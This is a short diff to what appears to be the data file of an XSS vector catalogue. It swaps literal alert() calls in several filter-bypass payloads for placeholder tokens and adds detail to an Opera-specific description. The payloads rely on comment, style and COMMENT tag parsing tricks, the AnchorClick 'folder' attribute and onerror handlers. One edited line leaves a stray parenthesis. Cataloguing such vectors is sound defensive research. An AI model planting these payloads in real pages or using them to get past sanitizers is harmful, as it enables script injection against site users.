@@ -1095,7 +1095,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>',
+        'data'       : '<a style="behavior:url(#default#AnchorClick);" folder="%js_uri_alert%">XXX</a>',
         'description': {
             'en' : 'Using the AnchorClick behavior allows to use the "folder" attribute as replacement for a "href" attribute on <A> elements.',
             'jp' : '',
@@ -1124,7 +1124,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<!--<img src="--><img src=x onerror=alert(3)//">',
+        'data'       : '<!--<img src="--><img src=x onerror=%js_alert%//">',
         'description': {
             'en' : 'This vector shows how comments are being parsed and what problems can arise in case user submitted HTML is allowed to contain comments.',
             'jp' : '',
@@ -1157,7 +1157,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<comment><img src="</comment><img src=x onerror=alert(1)//">',
+        'data'       : '<comment><img src="</comment><img src=x onerror=%js_alert%)//">',
         'description': {
             'en' : 'Besides <!---> the Internet Explorer allows to use <COMMENT> tags. The vector shows how comments are being parsed and what problems can arise in case user submitted HTML is allowed to contain comments.',
             'jp' : '',
@@ -1216,7 +1216,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<style><img src="</style><img src=x onerror=alert(1)//">',
+        'data'       : '<style><img src="</style><img src=x onerror=%js_alert%//">',
         'description': {
             'en' : 'This vector works on all tested user agents and shows how several filtering solutions can be tricked into accepting malicious HTML. A badly written filter will assume the error handler is part of the first image\'s "src" attribute and accept the incoming data.',
             'jp' : '',
@@ -1251,7 +1251,7 @@ var items =
         },
         'data'       : '<li style=list-style:url() onerror=%js_alert%>',
         'description': {
-            'en' : 'Opera 10.5 and earlier versions fire an error event for <LI> tags in case the background URL via style attribute cannot be loaded. The same works with "list-style-image" too. On Opera 10.10 and earlier more tag/style combinations like this work as well.',
+            'en' : 'Opera 10.5 and earlier versions fire an error event for <LI> tags in case the background URL via style attribute cannot be loaded. The same works with "list-style-image" too. On Opera 10.10 and earlier more tag/style combinations like background:url() and background-image:url() work as well.',
             'jp' : '',
             'ru' : '',
             'de' : ''
